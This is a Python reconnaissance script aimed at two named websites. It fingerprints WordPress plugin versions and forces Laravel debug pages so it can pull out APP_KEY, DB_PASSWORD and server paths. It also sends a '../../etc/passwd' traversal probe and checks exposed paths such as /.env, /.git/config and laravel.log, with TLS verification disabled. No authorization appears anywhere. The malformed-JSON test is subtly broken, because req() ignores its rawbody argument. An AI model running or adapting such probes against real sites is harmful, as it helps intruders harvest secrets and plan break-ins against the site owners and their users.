import urllib.request, urllib.error, urllib.parse, ssl, json, re, http.client

ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

def req(url, data=None, headers=None, method=None, rawbody=None, ctype=None, form=False, base="https://ofa377.com.tw"):
    h={"User-Agent":UA,"Accept":"*/*","Connection":"close"}
    if headers: h.update(headers)
    body=None
    if form and data is not None:
        body=urllib.parse.urlencode(data).encode(); h["Content-Type"]="application/x-www-form-urlencoded"
    elif data is not None:
        if isinstance(data,(bytes,)): body=data
        else: body=json.dumps(data).encode(); h["Content-Type"]="application/json"
    r=urllib.request.Request(url, data=body, headers=h, method=method or ("POST" if body else "GET"))
    try:
        resp=urllib.request.urlopen(r, timeout=20, context=ctx); return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e: return e.code, dict(e.headers), e.read()
    except Exception as e: return -1, {}, str(e).encode()

print("############ ofa377.com.tw VERSIONS ############")
# Rank Math version
s,h,b=req("https://ofa377.com.tw/wp-content/plugins/seo-by-rank-math/readme.txt")
print(f"[Rank Math readme] ST={s}")
m=re.search(r'Stability[^\n]*\nVersion:\s*([\d.]+)', b.decode(errors="ignore"))
if not m: m=re.search(r'version:\s*([\d.]+)', b.decode(errors="ignore"), re.I)
print("  Rank Math version:", m.group(1) if m else "?")
# WP version
s,h,b=req("https://ofa377.com.tw/feed/")
m=re.search(r'generator[^>]*WordPress ([\d.]+)', b.decode(errors="ignore"), re.I)
print("  WordPress version (feed):", m.group(1) if m else "?")
s,h,b=req("https://ofa377.com.tw/")
m=re.search(r'content="WordPress ([\d.]+)"', b.decode(errors="ignore"))
print("  WordPress version (html):", m.group(1) if m else "?")
# list some plugin dirs to fingerprint
for p in ["wp-content/plugins/elementor/readme.txt","wp-content/plugins/woocommerce/readme.txt",
          "wp-content/plugins/wordfence/readme.txt","wp-content/plugins/wp-super-cache/readme.txt",
          "wp-content/plugins/contact-form-7/readme.txt","wp-content/plugins/yith-woocommerce-ajax-navigation/readme.txt"]:
    s,h,b=req("https://ofa377.com.tw/"+p)
    ver=""
    if s==200:
        mm=re.search(r'Version:\s*([\d.]+)', b.decode(errors="ignore"))
        if mm: ver="v"+mm.group(1)
    print(f"  {p.split('/')[2]:45} ST={s} {ver}")

print("\n############ ofa77.shop Laravel APP_DEBUG ############")
OFA77="https://ofa77.shop"
# trigger a 404 and capture the debug dump
s,h,b=req(OFA77+"/__nonexistent_route_xyz123__")
print(f"[404 route] ST={s} len={len(b)} content-type={h.get('Content-Type')}")
open("ofa77_404_dump.html","wb").write(b)
t=b.decode(errors="ignore")
# extract file paths
paths=sorted(set(re.findall(r'(/[\w/.\-]+\.(?:php|html|py|js))', t)))
print(f"  Unique file paths in dump: {len(paths)}")
for p in paths[:25]: print("    ",p)
# extract class names / exceptions
exc=set(re.findall(r'([\w\\]+Exception|[\w\\]+Error)', t))
print("  Exceptions:", list(exc)[:15])
# look for APP_DEBUG / env / APP_KEY
for kw in ["APP_KEY","APP_DEBUG","DB_PASSWORD","APP_ENV","base_path","storage_path","public_path","http://","config/"]:
    mm=re.findall(r'.{0,40}'+re.escape(kw)+r'.{0,60}', t)
    if mm: print(f"  [{kw}]:", mm[0][:120])

# try a POST with malformed JSON to a real-looking endpoint for a 500
print("\n  --- attempt 500 via malformed input ---")
for path,method,body,ctype in [
  ("/api/module/unionshop/anything","POST",'{"bad': "application/json"),
  ("/module/admin/unionshop/user/login","POST", None, None),
  ("/?sort=../../etc/passwd","GET",None,None),
]:
    if body is None:
        s,h2,b=req(OFA77+path, method=method)
    else:
        s,h2,b=req(OFA77+path, method=method, rawbody=body, ctype=ctype)
    tt=b.decode(errors="ignore")
    has_dump="Sfdumper" in tt or "Symfony" in tt or "Exception" in tt
    print(f"  {method} {path:45} ST={s} len={len(b)} debug_dump={has_dump}")

# UnionCMS common paths
print("\n  --- UnionCMS / Unishop path probing ---")
for p in ["/","/index.php","/index.php?m=home","/home/","/goods/","/cart/","/user/login",
          "/api/","/api/home/info","/module/admin/unionshop/user/login","/admin/","/admin.php",
          "/install/","/install/index.php","/setup/","/upgrade/","/backup/","/uploads/",
          "/views/","/themes/","/template/","/static/","/public/","/.git/config","/.env",
          "/storage/logs/laravel.log","/server-status"]:
    s,h2,b=req(OFA77+p)
    ct=h2.get("Content-Type","")
    flag=""
    if s in (301,302): flag="-> "+h2.get("Location","")
    print(f"  {s:4} {p:42} len={len(b):7} {flag}")
